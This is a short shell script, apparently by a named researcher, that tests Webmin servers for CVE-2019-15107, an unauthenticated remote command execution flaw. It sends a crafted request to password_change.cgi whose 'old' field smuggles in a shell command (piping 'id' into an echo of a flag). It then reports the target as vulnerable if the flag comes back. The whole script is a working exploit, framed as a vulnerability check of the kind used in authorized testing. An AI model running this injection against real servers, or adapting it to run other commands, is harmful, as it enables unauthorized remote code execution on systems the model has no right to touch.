#!/bin/sh
#
# CVE-2019-15107 Webmin Unauhenticated Remote Command Execution
# based on Metasploit module https://www.exploit-db.com/exploits/47230
# Original advisory: https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
# Alternative advisory (spanish): https://blog.nivel4.com/noticias/vulnerabilidad-de-ejecucion-de-comandos-remotos-en-webmin
#
# Fernando A. Lagos B. (Zerial)
# https://blog.zerial.org
# https://blog.nivel4.com
#
# The script sends a flag by a echo command then grep it. If match, target is vulnerable.
#
# Usage: sh CVE-2019-15107.sh https://target:port
# Example: sh CVE-2019-15107.sh https://localhost:10000
# output: Testing for RCE (CVE-2019-15107) on https://localhost:10000: VULNERABLE!
#

FLAG="f3a0c13c3765137bcde68572707ae5c0"
URI=$1;

echo -n "Testing for RCE (CVE-2019-15107) on $URI: ";
curl -ks $URI'/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id|echo '$FLAG'&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: '$URI'/session_login.cgi'|grep $FLAG>/dev/null 2>&1

if [ $? -eq 0 ];
then
	echo '\033[0;31mVULNERABLE!\033[0m'
else
	echo '\033[0;32mOK! (target is not vulnerable)\033[0m'
fi
#EOF